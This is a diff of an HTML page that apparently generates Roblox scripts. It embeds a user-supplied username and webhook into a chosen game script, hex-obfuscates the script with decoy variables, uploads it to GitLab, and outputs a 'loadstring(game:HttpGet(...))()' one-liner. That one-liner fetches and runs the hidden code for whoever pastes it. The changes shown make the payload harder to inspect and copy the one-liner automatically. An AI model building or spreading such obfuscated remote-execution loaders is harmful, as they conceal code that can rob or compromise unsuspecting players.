@@ -30,7 +30,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
-        input, select, button, textarea {
+        input, select, button {
             padding: 10px;
             border-radius: 8px;
             border: none;
@@ -48,10 +48,11 @@
             background: #ff0055;
             transform: scale(1.1);
         }
-        textarea {
-            width: 400px;
-            height: 100px;
-            resize: none;
+        #copyButton {
+            background: #0080ff;
+        }
+        #copyButton:hover {
+            background: #0055ff;
         }
     </style>
 </head>
@@ -68,22 +69,27 @@
             <option value="Pets Go">Pets Go</option>
         </select>
         <button onclick="generateScript()">Generate Script</button>
-        <textarea id="script-output" readonly></textarea>
-        <button onclick="copyToClipboard()">Copy Loadstring</button>
+        <button id="copyButton" onclick="copyLoadstring()" style="display:none;">Copy Loadstring</button>
+        <p id="loadstringText"></p>
     </div>
 
     <script>
-        function encodeBase64(str) {
-            return btoa(unescape(encodeURIComponent(str)));
-        }
-
         function encodeHex(str) {
-            return str.split('').map(c => `\\${c.charCodeAt(0)}`).join('');
+            return str.split('').map(char => char.charCodeAt(0).toString(16)).join('');
         }
 
         function obfuscateScript(script) {
-            let encodedScript = encodeHex(script);
-            return `return(function(...) local K={"${encodedScript}"}; loadstring(K[1])() end)`;
+            let hexEncoded = encodeHex(script);
+            let var1 = "X" + Math.floor(Math.random() * 9999);
+            let var2 = "Y" + Math.floor(Math.random() * 9999);
+
+            return `return(function(...)
+    local ${var1} = "${hexEncoded}"
+    local ${var2} = (${var1}):gsub('..', function(hex) return string.char(tonumber(hex, 16)) end)
+    local fakeVar1 = 1337 * math.random()
+    local fakeVar2 = "OBF" .. tostring(math.random(1000,9999))
+    return loadstring(${var2})()
+end)()`;
         }
 
         async function uploadToGitLab(scriptContent) {
@@ -134,23 +140,24 @@
 
             let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
 
-            alert("Original Script:\n\n" + script);
-
             let obfuscatedScript = obfuscateScript(script);
-            alert("Obfuscated Script:\n\n" + obfuscatedScript);
 
             let uploadedUrl = await uploadToGitLab(obfuscatedScript);
             if (uploadedUrl) {
-                let loadstring = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
-                document.getElementById('script-output').value = loadstring;
+                let loadstringCode = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
+                document.getElementById("loadstringText").innerText = loadstringCode;
+                document.getElementById("copyButton").style.display = "block";
+                navigator.clipboard.writeText(loadstringCode);
+                alert("Loadstring copied:\n" + loadstringCode);
             }
         }
 
-        function copyToClipboard() {
-            let output = document.getElementById('script-output');
-            output.select();
-            document.execCommand("copy");
-            alert("Loadstring copied!");
+        function copyLoadstring() {
+            let text = document.getElementById("loadstringText").innerText;
+            if (text) {
+                navigator.clipboard.writeText(text);
+                alert("Loadstring copied!");
+            }
         }
     </script>
 
